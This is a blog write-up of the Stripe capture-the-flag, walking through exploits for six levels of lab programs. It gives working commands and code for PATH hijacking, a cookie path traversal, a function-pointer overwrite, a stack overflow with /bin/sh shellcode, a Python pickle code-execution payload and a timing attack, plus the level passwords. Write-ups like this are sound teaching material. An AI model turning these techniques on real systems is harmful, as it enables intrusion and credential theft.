+++
date = "2012-03-20T20:28:17-05:00"
draft = false
title = "Stripe CTF"

+++

So, a couple weeks back, I took part in the [Stripe CTF][ctf]. Now that they've
released the VM images of the CTF, and their own example solutions (see
[here][wrapup] for the wrap-up, [here][ctfcode] for the code), I figured I'd
write my own post-mortem. I managed to solve all 6 levels, even though I'm not
entirely happy with the solution for the final level (level06). Below, you can
find how I solved each level. Some of my solutions were slightly edited for
clarity (e.g. to remove stuff like debugging code).


## Level01

The CTF starts off with the password `e9gx26YEb2`, and the instructions to SSH
to `level01@ctf.stri.pe`. That's simple enough, so I went ahead and did that.
For each level, you can read the code for that level to determine how best to
proceed to the next level. level01 started off with a simple program that
executed `system("date")`. The binary is setuid as level02, so if we can
somehow get it to execute our own code, we can read the next level's password
file (which was at `/home/levelXX/.password` for every level).

`system()` finds the command through the `PATH` environment variable, which
means that if you change that, it'll execute a custom "date" binary instead.
So, it's simple enough to write a pretty basic program or shell script that
opens and prints the contents of `/home/level02/.password`, which will then be
printed by the level02 binary itself. Problem solved! You could do other stuff
like launch a shell, or copy the password file somewhere else, but it's not
necessary.

In short:

```
level01@ctf6:/tmp/tmp.TuSk2nyts9$ echo "cat /home/level02/.password" > date
level01@ctf6:/tmp/tmp.TuSk2nyts9$ chmod +x date
level01@ctf6:/tmp/tmp.TuSk2nyts9$ PATH=`pwd` /levels/level01
Current time: kxlVXUvzv
```

The password to level02 is: `kxlVXUvzv`

## Level02

In this level, you're given a PHP script running as level03 that will greet
you. It does this by setting a cookie with a file path in it, and then saving
the username and age you give it in this file. On further visits to the page,
it'll read path from the cookie, read the associated file, and then print
‘You're NAME, and your age is AGE'.

Of course, the problem with all of this is, the file path is being stored on
the client side. This means that if we can somehow get the PHP script to read
the password file, it will print it out for us! Remember, the password file for
the next level is at `/home/level03/.password`, and the relevant line in the
PHP script is:

    $out = file_get_contents('/tmp/level02/'.$_COOKIE['user_details']);

So, all you need to do is create a path that will resolve to the password file,
and pass it as a cookie. I did it in curl as a one-liner. Note that the site
uses HTTP Digest Authentication, so you need to give the username and password
for this level. The switch `--digest` will tell curl to use digest
authentication, so the command is:

    curl -s --cookie "user_details=../../home/level03/.password" --user level02:kxlVXUvzv --digest http://ctf.stri.pe/level02.php | grep "<p>"

The password to level03 is: `Or0m4UX07b`

## Level03

This level is where things start to get tricky. The source code for level03
shows that we have a program that converts the first parameter to a number, and
then uses that number to call a function from an array of function pointers,
passing the second parameter as an argument. There's also a bug in the
`capitalize()` - `printf("\n", str);` has an extra parameter. I didn't need it,
though. The important bits of code are as follows:

{{< highlight c >}}
typedef int (*fn_ptr)(const char *);

// [...]

int main(int argc, char **argv)
{
    int index;
    fn_ptr fns[NUM_FNS] = {&to_upper, &to_lower, &capitalize, &length};

    // [...]

    index = atoi(argv[1]);
    if (index >= NUM_FNS) {
        // [...]
        exit(-1);
    }
    return truncate_and_call(fns, index, argv[2]);
}

// [...]

int truncate_and_call(fn_ptr *fns, int index, char *user_string)
{
    char buf[64];
    // Truncate supplied string
    strncpy(buf, user_string, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';
    return fns[index](buf);
}

int run(const char *str)
{
    // This function is now deprecated.
    return system(str);
}
{{< /highlight >}}

The four functions you can call are: `to_upper`, `to_lower`, `capitalize`,
`length`, and do exactly what they say. However, there's also a `run()` function
(at address 0x0804875B) that was left in the binary, but isn't in the array, as
seen above. That function will call `system()` on the provided argument. If we
could somehow get that function to run, we'd be able to execute code of our
liking! Thankfully, the program doesn't check for negative numbers, so we're in
luck.

If we run the program under gdb (which, by the way, clears the setuid bit), we
can observe that the buffer buf, which contains our command-line string, is
placed on the stack at address 0xffb3712c (this will be different for each run,
due to [ASLR][aslr]), and our function pointers are at address 0xffb3719c. The gdb
transcript is:

```
(gdb) break main
Breakpoint 1 at 0x80487d8: file level03.c, line 68.
(gdb) run 0 asdf
(gdb) x fns
0xffb3719c:     0xffb371b8
(gdb) break truncate_and_call
Breakpoint 2 at 0x8048780: file level03.c, line 57.
(gdb) c
(gdb) x buf
0xffb3712c:     0x00000000
```

If you look at the layout of the stack in-memory, it would look something like this:

```
0xffb3712c      buf[64]

[...]

0xffb3719c      fns: &to_upper
                fns: &to_lower
                fns: &capitalize
                fns: &length
```

If you subtract the two addresses you get 0xffb3719c - 0xffb3712c = 0x70,
which, when we divide by the size of a pointer, is 0x28. So, running something
like `/levels/level03 -28 blah` would call `fns[-28]`, which is &fns - 28 *
size of a pointer, which works out to be &fns - 0x70. From above, we see that
this would call a function pointer that's stored in the `buf[]` array. Now, we
can put things in this array, by passing them on the command line, and
therefore we can call an arbitrary function pointer we control. Things are a
bit more complex - we need to get the program to run a script we control, and
we're in some temporary directory. So, we need to calculate the length of the
directory (20 characters, for me), and then place a function pointer there. So,
here's what I ran to gain control:

{{< highlight shell >}}
export VAL=`pwd``printf "\x5B\x87\x04\x08"`
echo "#/bin/bash" >> test2
echo "/bin/cat /home/level04/.password" >> test2
/levels/level03 -23 $VAL
{{< /highlight >}}

Note that "\x5B\x87\x04\x08" is the little-endian hexadecimal representation of
our function pointer 0x0804875B, which is the address of the run() function in
memory.

To summarize: the program runs, and then eventually executes the line return
`fns[index](buf);`. In our case, `index` is -23, which reads a function pointer
from offset 20 in the buffer `buf[]`. We've placed our little-endian function
pointer there, so the program will execute something like: `return 0x0804875B`.
And, we've created the file `/tmp/whatever123456/\x5B\x87\x04\x08`, which
contains a shell script that reads the next level's password file.

The final result - our password for level04 is: `i5cBbPvPCpcP`

Note: Depending on the length of the temporary directory path, we may have to
change things or add padding to our filename. This would be as simple as adding
1-3 bytes of "a"s before the function pointer and modifying our index by 1.
Remember - the function pointer must start on a multiple of 4 characters!

## Level04

This level is the second-hardest level in this entire CTF, in my opinion.
You're given a very simple program, with the following code somewhere in it:

{{< highlight c >}}
void fun(char *str)
{
  char buf[1024];
  strcpy(buf, str);
}
{{< /highlight >}}

The parameter `str` is `argv[1]` (called like: `fun(argv[1]);`), so we can put
arbitrary data into it. Now, the first thing to think of is: what happens if
the value of str is LONGER than 1024 characters? Well, `strcpy` will happily
keep copying until it eventually reaches a null byte (0x00), so it'll overwrite
whatever happens to be after that in memory. Thankfully for us, on x86 the
return address is at a higher address than the buffer pointer on the stack -
something like this:

```
buf[0]
buf[1]
...
buf[1023]
<other stuff>
return address
```

If we can overwrite that return address, we can cause the program to return
(i.e. transfer execution) to an address we control. Of course, it's not quite
that easy. In this binary, we don't have any handy run() function that will run
another program for us. So, we need to be able to run some code we control,
too. However, we have a problem. As I mentioned earlier, ASLR is enabled. This
is a technology that's designed to make it harder to do exactly this - exploit
programs. Specifically what it does is randomize the addresses in-memory of
various parts of a program - including the stack. So, we can't simply use a
hard-coded pointer to our buffer. No, we need to get tricky!

According to the [documentation][strcpy], "The strcpy() function shall return
s1; no return value is reserved to indicate an error". In short, it means it
will return the address of our buffer. On x86, the return value of a function
compiled with a standard calling convention (i.e. stdcall, cdecl, etc.) will be
placed in the EAX register. So, we have an opportunity here. We overwrite the
buf array, and also the return address. Once the function returns, it will
transfer execution to a location we can specify. At offset 0x0804857b in the
executable provided, there is a "CALL EAX" instruction. So, we can make the
program return to an address that will then transfer execution to our buffer.

Once we've got execution transferred to our buffer, we need to do something
with that. I settled on a quick exploit that would clear registers, push
"/bin/sh" to stack, and then execute it - giving me shell access:

{{< highlight nasm >}}
xor     ecx,ecx     ; 31c9
mul     eax,ecx     ; f7e1
push    ecx         ; 51
push    68732F2Fh   ; 682f2f7368
push    6E69622Fh   ; 682f62696e
mov     ebx,esp     ; 89e3
mov     al,0Bh      ; b00b
int     80h         ; cd80
{{< /highlight >}}

I've provided the hex code of the exploit in the comments, for reference. Note
the lack of null (0x00) bytes - since `strcpy()` will copy up to the first null
byte, if there's one in the exploiit, it will cause the exploit to fail. Thus,
we simply clear eax and ecx, push ecx (which is now 0x00000000) to the stack
for our null terminator, push "/bin/sh" encoded as hex, and then call the
system call `sys_execve` (index 0x0B) to run it.

A couple technical notes: if we simply run that as given, it'll segfault.
Specifically what happens is that `esp` is still pointing to our shellcode,
which means we're actually overwriting our own code. I simply "cheated" and put
a bunch of "DEC ESP" commands at the beginning of the shellcode (hex 0x4C).

My final exploit string is (note that it's all on one line):

{{< highlight shell >}}
export SC=`perl -e 'print "\x90" x 915 . "\x31\xc9\xf7\xe1" . "\x4c" x 100 . "\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" . "\x7b\x85\x04\x08" . "CCCC" x 10'` /levels/level04 $SC
{{< /highlight >}}

From within the resulting shell, we can simply cat the password file, and we
get: `fzfDGnSmd317`

## Level05

This one is actually pretty easy. There's a Python script running that provides
the ability to convert an input string to uppercase. We notice that the program
serializes jobs with python's pickle module, and then sends them to a series of
workers, who then deserialize and process the job. Some excerpts from the
program are:

{{< highlight python >}}
@staticmethod
def deserialize(serialized):
    logger.debug('Deserializing: %r' % serialized)
    parser = re.compile('^type: (.*?); data: (.*?); job: (.*?)$', re.DOTALL)
    match = parser.match(serialized)
    direction = match.group(1)
    data = match.group(2)
    job = pickle.loads(match.group(3))
    return direction, data, job

@staticmethod
def serialize(direction, data, job):
    serialized = """type: %s; data: %s; job: %s""" % (direction, data, pickle.dumps(job))
    logger.debug('Serialized to: %r' % serialized)
    return serialized
{{< /highlight >}}

And you can submit jobs like this:

{{< highlight shell >}}
curl localhost:9020 -d "uppercase me"
{{< /highlight >}}

From this, we notice that the format of the serialized jobs is as follows:

    type: blah; data: some data here; job: blah blah blah

So, we can force the program to deserialize our own custom data by manually
crafting a request to the program that looks like this:

{{< highlight shell >}}
curl localhost:9020 -d "asdf; job: pickled data here"
{{< /highlight >}}

This will cause the program to unpickle the data "pickled data here". So, we
can control the unpickling process - what now? Well, the pickle module is known
to be insecure. As it says in the [pickle documentation][pickle]: "The pickle
module is not intended to be secure against erroneous or maliciously
constructed data.  Never unpickle data received from an untrusted or
unauthenticated source.".

Also from this documentation, we see that there's a magic method defined
(`__reduce__`) that will be called when unpickling the class. We can therefore
write a custom class that will execute our own custom python code when it's
unpickled:

{{< highlight python >}}
q = '__import__("os").system("/bin/cat /home/level06/.password > /tmp/tmp.hSIOEi8xJ1/paswd")'
class Job(object):
    def __reduce__(self):
        return (eval, (q,))
{{< /highlight >}}

I simply had the program read the password file, and then write it to the
temporary directory I was currently in. The method given should work for any
arbitrary `system()` call, so other methods are possible. Note that simply
copying the file using cp doesn't work, as cp will copy the permissions of the
file, too.

After we have this, we have to generate our pickled data:

{{< highlight python >}}
x = pickle.dumps(Job())
{{< /highlight >}}

And then urlencode it, since our web server will helpfully urldecode() it for us.

{{< highlight python >}}
print urllib.quote(x)
{{< /highlight >}}

Finally, we need to generate some data that will bypass the regex. Our final one-line command is:

{{< highlight shell >}}
    curl localhost:9020  -d "asdf; job: c__builtin__%0Aeval%0Ap0%0A%28S%27__import__%28%22os%22%29.system%28%22/bin/cat%20/home/level06/.password%20%3E%20/tmp/tmp.hSIOEi8xJ1/paswd%22%29%27%0Ap1%0Atp2%0ARp3%0A."
{{< /highlight >}}

From all this, we get: `SF2w8qU1QDj`

## Level06

The final level! And, as is benefiting a final level, it's HARD. I'll link you
to the [source code of the program][level06] - go read it, and then come back
here.

Done? OK. Here's a short description of the vulnerability. The utility will
print out a "." to stderr on each comparison iteration. Upon the first
mismatch, it will then fork(), and the child process will execl() /bin/echo to
taunt the user. There are two potential attack vectors here:

The first idea is a timing attack. A fork() will cause the iteration with the
first non-matching character to take longer than all other iterations. If we
could somehow measure the length of each iteration, we could bruteforce each
character one-at-a-time, reducing the complexity from keyspace^length passwords
to keyspace * length passwords - a significant reduction.

The second is an output order attack. If we can somehow serialize the writes to
stdout and stderr, we would see something like the following:

    Welcome to the password checker!
    .. Ha ha, your password is incorrect!
    ......

instead of

    Welcome to the password checker!
    ........
    Ha ha, your password is incorrect!

And this would then inform us that our second character is incorrect.

I tried a couple of approaches to this problem. My first thought was to use a
FIFO (see [mkfifo][mkfifo]), hook both stdout and stderr to it, and then read
one byte at a time, so that the writes would be serialized. This didn't work,
so I eventually decided to use a timing attack. My final code essentially did
this:

{{< highlight c >}}
clock_gettime(CLOCK_MONOTONIC, &t);
// [...]
ch = getchar();
clock_gettime(CLOCK_MONOTONIC, &t2);
{{< /highlight >}}

And then, after getting the times, I would subtract them. This measures the
difference between two successive dots being printed. On the iteration that is
incorrect, the level06 binary would fork(), which would cause that iteration to
take much longer than the others. Running this program like this:

{{< highlight shell >}}
#/bin/sh
/levels/level06 /home/the-flag/.password $1 2>&1 | ./timer
{{< /highlight >}}

Would give a result like this:

    level06@ctf4:/tmp/tmp.AuZnjcVqKo$ ./run.sh theflagaa
    0.000001028
    0.000001028
    0.000001028
    0.000001028
    0.000001058
    0.000001028
    0.000001028
    0.000001028
    0.000101752

The first characters ("theflag") are correct, but the next character ("a") is
not. This causes the last line to show an elapsed time approximately 100 times
that of the other lines, thus showing that it is incorrect. Some Python
scripting later, and I was able to brute-force the solution to the last level.
It took several hours, due to other people using the machine, which would throw
off the timing results.

A couple of quick notes: you have to link the program with -lrt, for the
real-time library, and you should probably test a couple of times, to reduce
the effect of other programs running on the same machine.

Finally, though, I was able to obtain the last password: `theflagl0eFTtT5oi0nOTxO5`

If I have some free time in the next couple weeks, I might go back to this
question and come up with a "real" - i.e. elegant - solution to this problem.
If I do, I'll make another blog post!

## Conclusion and Summary

In conclusion, this CTF was a lot of fun! It tested my knowledge of many
different aspects of computer security, and generally made for an entertaining
two days. Here's a list of all the passwords, in order:

```
level01: e9gx26YEb2
level02: kxlVXUvzv
level03: Or0m4UX07b
level04: i5cBbPvPCpcP
level05: fzfDGnSmd317
level06: SF2w8qU1QDj
theflag: theflagl0eFTtT5oi0nOTxO5
```

Also, [here's][writeup01] [some][writeup02] [other][writeup03]
[writeups][writeup04] that people have published. Seeing how other people did
things is always really cool!


[ctf]: https://stripe.com/blog/capture-the-flag
[wrapup]: https://stripe.com/blog/capture-the-flag-wrap-up
[ctfcode]: https://github.com/abrody/stripe-ctf/
[aslr]: http://en.wikipedia.org/wiki/Address_space_layout_randomization
[strcpy]: http://pubs.opengroup.org/onlinepubs/009695399/functions/strcpy.html
[pickle]: http://docs.python.org/library/pickle.html
[level06]: https://github.com/abrody/stripe-ctf/blob/master/code/level06/level06.c
[mkfifo]: http://linux.die.net/man/3/mkfifo
[writeup01]: http://blog.zx2c4.com/781
[writeup02]: http://willcodeforfoo.com/2012/02/capture-the-flag/
[writeup03]: https://github.com/dividuum/stripe-ctf
[writeup04]: https://gist.github.com/michaelpetrov/1899630
